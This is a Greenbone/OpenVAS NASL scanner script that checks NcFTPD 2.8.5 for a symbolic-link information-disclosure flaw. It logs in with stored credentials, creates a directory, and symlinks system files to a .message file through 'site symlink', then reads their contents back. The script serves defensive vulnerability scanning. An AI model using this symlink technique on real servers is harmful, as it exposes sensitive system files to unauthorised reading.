if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100250" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-07-28 21:43:08 +0200 (Tue, 28 Jul 2009)" );
	script_bugtraq_id( 35822 );
	script_tag( name: "cvss_base", value: "4.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:P/I:N/A:N" );
	script_name( "NcFTPD Symbolic Link Information Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "FTP" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc", "os_detection.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/ncftpd/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/35822" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/52067" );
	script_tag( name: "summary", value: "NcFTPD is prone to a remote information-disclosure vulnerability." );
	script_tag( name: "impact", value: "Remote attackers can exploit this issue to view sensitive information.
  Information obtained may lead to further attacks." );
	script_tag( name: "affected", value: "NcFTPD 2.8.5 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
if(ContainsString( user, "anonymous" ) || ContainsString( user, "ftp" )){
	exit( 0 );
}
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "NcFTPd" )){
	exit( 0 );
}
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	exit( 0 );
}
files = traversal_files();
login_details = ftp_log_in( socket: soc1, user: user, pass: pass );
if(login_details){
	ftpPort2 = ftp_get_pasv_port( socket: soc1 );
	if(ftpPort2){
		soc2 = open_sock_tcp( port: ftpPort2, transport: get_port_transport( ftpPort ) );
		if(soc2){
			vtstrings = get_vt_strings();
			dir = vtstrings["lowercase_rand"];
			mkdir = ftp_send_cmd( socket: soc1, cmd: NASLString( "MKD ", dir ) );
			if(IsMatchRegexp( mkdir, "257.*directory created" )){
				for pattern in keys( files ) {
					file = files[pattern];
					slink = ftp_send_cmd( socket: soc1, cmd: NASLString( "site symlink /", file, " ", dir, "/.message" ) );
					if(IsMatchRegexp( slink, "250 Symlinked" )){
						cd = ftp_send_cmd( socket: soc1, cmd: NASLString( "CWD ", dir ) );
						if(egrep( string: cd, pattern: pattern )){
							close( soc2 );
							ftp_close( socket: soc1 );
							close( soc1 );
							info = NASLString( "Here are the contents of the file '/" + file + "' that was read from the remote host:\\n\\n" );
							info += cd;
							info += NASLString( "\\n\\nPlease delete the directory " );
							info += dir;
							info += NASLString( " immediately.\\n" );
							security_message( port: ftpPort, data: info );
							exit( 0 );
						}
					}
				}
			}
			close( soc2 );
		}
	}
}
ftp_close( socket: soc1 );
close( soc1 );
exit( 99 );

